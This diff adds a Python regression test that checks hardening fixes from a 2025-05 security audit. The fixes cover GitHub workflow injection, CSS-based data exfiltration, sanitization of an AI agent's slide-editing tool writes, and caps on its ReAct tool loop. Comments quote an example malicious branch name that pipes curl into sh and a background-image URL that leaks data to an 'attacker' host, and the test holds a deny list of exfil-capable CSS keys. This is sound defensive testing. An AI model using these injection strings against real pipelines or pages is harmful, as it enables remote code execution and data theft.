@@ -256,6 +256,169 @@ def test_security():
         fail("item-level link sanitization", "icon-row/flow/etc. item links must be sanitizeUrl'd")
 
 
+# ━━━ Audit 2025-05 hardening fixes (CRITICAL/HIGH from security audit) ━
+# Covers: shell-injection in release-preview workflow (C1), github-script
+# JS-injection via test stdout (C2), LOAD_LANES sanitization (H1),
+# block.style CSS-key allowlist (H2), ReAct loop caps (H5).
+
+def test_audit_2025_05_fixes():
+    print("\n── Audit 2025-05 Hardening Fixes ──")
+    workflows = os.path.join(REPO_ROOT, ".github", "workflows")
+    rp_path = os.path.join(workflows, "release-preview.yml")
+    ci_path = os.path.join(workflows, "ci.yml")
+    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
+    imports = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
+    engine  = open(os.path.join(PARTS_DIR, "part-engine.jsx"), encoding="utf-8").read()
+
+    # ── C1: release-preview.yml must not interpolate inputs.pr_ref into a
+    #        `run:` shell command. The branch name is attacker-controlled
+    #        (`feat$(curl evil|sh)` is a valid git ref) and the job holds
+    #        id-token: write + attestations: write.
+    if os.path.exists(rp_path):
+        rp_lines = open(rp_path, encoding="utf-8").read().splitlines()
+        # Walk: when we see `run: |`, record its indent; the block ends at
+        # the next non-blank line with indent <= the run's. Inside the
+        # block, any `${{ inputs.pr_ref }}` is shell injection.
+        in_run = False
+        run_indent = -1
+        offenders = []
+        for line in rp_lines:
+            indent = len(line) - len(line.lstrip())
+            if in_run:
+                if line.strip() and indent <= run_indent:
+                    in_run = False
+                elif "${{ inputs.pr_ref }}" in line or "${{inputs.pr_ref}}" in line:
+                    offenders.append(line.strip())
+            if not in_run and re.match(r'^\s*run:\s*\|\s*$', line):
+                in_run = True
+                run_indent = indent
+        if offenders:
+            fail("C1 release-preview.yml shell-injection",
+                 f"{len(offenders)} run-block uses of inputs.pr_ref — use env: + \"$PR_REF\"")
+        else:
+            ok("C1 release-preview.yml does not shell-interpolate inputs.pr_ref")
+    else:
+        fail("C1 release-preview.yml not found", rp_path)
+
+    # ── C2: ci.yml must not interpolate step outputs into github-script JS
+    #        via `${{ steps.X.outputs.output }}` inside JS template-literals.
+    #        Test stdout is attacker-controlled (PR can add fixtures whose
+    #        names contain backticks). Use env: + process.env instead.
+    if os.path.exists(ci_path):
+        ci_lines = open(ci_path, encoding="utf-8").read().splitlines()
+        # The unsafe pattern is `${{ steps.X.outputs.output }}` interpolated
+        # inside a github-script body (the `script: |` block) — that inlines
+        # attacker-controlled stdout into the JS source. The same expression
+        # inside an `env:` mapping is safe (it becomes process.env.X at
+        # runtime). Walk and only flag occurrences inside a `script: |` block.
+        in_script = False
+        script_indent = -1
+        offenders = []
+        for line in ci_lines:
+            indent = len(line) - len(line.lstrip())
+            if in_script:
+                if line.strip() and indent <= script_indent:
+                    in_script = False
+                elif re.search(r'\$\{\{\s*steps\.\w+\.outputs\.output\s*\}\}', line):
+                    offenders.append(line.strip())
+            if not in_script and re.match(r'^\s*script:\s*\|\s*$', line):
+                in_script = True
+                script_indent = indent
+        if offenders:
+            fail("C2 ci.yml github-script test-output interpolation",
+                 f"{len(offenders)} script-block uses of steps.*.outputs.output — use env: mapping")
+        else:
+            ok("C2 ci.yml does not interpolate step stdout into github-script JS")
+    else:
+        fail("C2 ci.yml not found", ci_path)
+
+    # ── H1: LOAD_LANES reducer case must sanitize lanes — Vera ReAct tool
+    #        writes (`set_slides`, `add_slide`, `edit_slide`) round-trip
+    #        through LOAD_LANES, the only ingest path that previously skipped
+    #        sanitizeSlide.
+    # Extract LOAD_LANES case body (handles both one-line and multi-line forms).
+    m = re.search(r'case "LOAD_LANES":\s*(.+?)(?=\n\s*case "|\n\s*default:)', reducer, re.DOTALL)
+    if m and "sanitizeSlide" in m.group(1):
+        ok("H1 LOAD_LANES reducer routes lanes through sanitizeSlide")
+    else:
+        fail("H1 LOAD_LANES sanitization",
+             "LOAD_LANES must map lanes→items→slides through sanitizeSlide")
+
+    # ── H2: sanitizeBlock must allowlist CSS keys in block.style — the
+    #        previous typecheck-only guard permitted `backgroundImage:
+    #        url(https://attacker/?d=...)` as a zero-click exfil channel.
+    if "SAFE_STYLE_KEYS" in imports:
+        ok("H2 SAFE_STYLE_KEYS allowlist defined")
+    else:
+        fail("H2 SAFE_STYLE_KEYS allowlist missing",
+             "block.style must be filtered through an allowlist of safe CSS keys")
+    if "sanitizeStyle" in imports:
+        ok("H2 sanitizeStyle helper defined")
+    else:
+        fail("H2 sanitizeStyle helper missing")
+    # Dangerous CSS values (url(), expression(), <, javascript:) must be
+    # rejected even when the key is allowlisted (e.g. a future addition
+    # could expose content: which accepts url()).
+    if re.search(r'sanitizeStyle[\s\S]{0,800}?url\s*\(', imports):
+        ok("H2 sanitizeStyle rejects values containing url(")
+    else:
+        fail("H2 sanitizeStyle url() guard",
+             "must reject any value containing url( to prevent CSS exfil")
+    # Image-loading CSS keys (background-image et al.) must NOT be in the
+    # allowlist — they are the primary exfil vector.
+    m = re.search(r'SAFE_STYLE_KEYS\s*=\s*new Set\(\[([^\]]+)\]', imports)
+    if m:
+        # Parse out individually quoted entries so we match whole keys, not
+        # substrings (avoids "justifyContent" matching the substring "content").
+        keys = set(re.findall(r'"([^"]+)"', m.group(1)))
+        keys_lower = {k.lower() for k in keys}
+        forbidden = {"backgroundimage", "background", "borderimage",
+                     "liststyleimage", "liststyle", "cursor", "content",
+                     "mask", "webkitmask", "filter", "font", "src",
+                     "clippath"}
+        leaked = sorted(forbidden & keys_lower)
+        if not leaked:
+            ok("H2 SAFE_STYLE_KEYS excludes image-loading keys")
+        else:
+            fail("H2 SAFE_STYLE_KEYS leaks exfil keys", f"contains: {leaked}")
+    # And the block-level style filter must invoke sanitizeStyle, not just
+    # typecheck. Either pattern is fine: direct assignment from sanitizeStyle,
+    # or `const s = sanitizeStyle(clean.style)` followed by `clean.style = s`.
+    if re.search(r'sanitizeStyle\(\s*clean\.style\s*\)', imports):
+        ok("H2 sanitizeBlock routes clean.style through sanitizeStyle")
+    else:
+        fail("H2 sanitizeBlock style routing",
+             "clean.style must pass through sanitizeStyle()")
+
+    # ── H5: ReAct loop must cap tool-calls per turn and total messages size
+    #        to prevent cost-amplification DoS. Previously only iteration
+    #        count (12) was capped; tool_calls per iter was unbounded.
+    if "MAX_TOOLS_PER_TURN" in engine:
+        ok("H5 MAX_TOOLS_PER_TURN cap defined")
+    else:
+        fail("H5 MAX_TOOLS_PER_TURN missing",
+             "ReAct loop needs a per-turn tool-call cap")
+    if "MAX_TOTAL_TOOLS" in engine:
+        ok("H5 MAX_TOTAL_TOOLS cap defined")
+    else:
+        fail("H5 MAX_TOTAL_TOOLS missing",
+             "ReAct loop needs a session-total tool-call cap")
+    if "MAX_MESSAGES_BYTES" in engine:
+        ok("H5 MAX_MESSAGES_BYTES cap defined")
+    else:
+        fail("H5 MAX_MESSAGES_BYTES missing",
+             "ReAct loop needs a messages-size cap")
+    # The caps must actually be enforced inside the for-loop, not just
+    # declared.
+    loop_match = re.search(r'for \(let iter = 0; iter < 12;[\s\S]+?\n\s{4}\}\n', engine)
+    loop_body = loop_match.group(0) if loop_match else ""
+    if "MAX_TOOLS_PER_TURN" in loop_body and "MAX_TOTAL_TOOLS" in loop_body and "MAX_MESSAGES_BYTES" in loop_body:
+        ok("H5 ReAct loop body enforces all three caps")
+    else:
+        fail("H5 ReAct loop enforcement",
+             "MAX_TOOLS_PER_TURN / MAX_TOTAL_TOOLS / MAX_MESSAGES_BYTES must be checked inside the for loop")
+
+
 # ━━━ Known Bugs (regression watchlist) ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def test_known_bugs():
@@ -2384,6 +2547,7 @@ if __name__ == "__main__":
     if run_unit:
         test_unit()
         test_security()
+        test_audit_2025_05_fixes()
         test_known_bugs()
         test_ip_hygiene()
         test_v10_features()
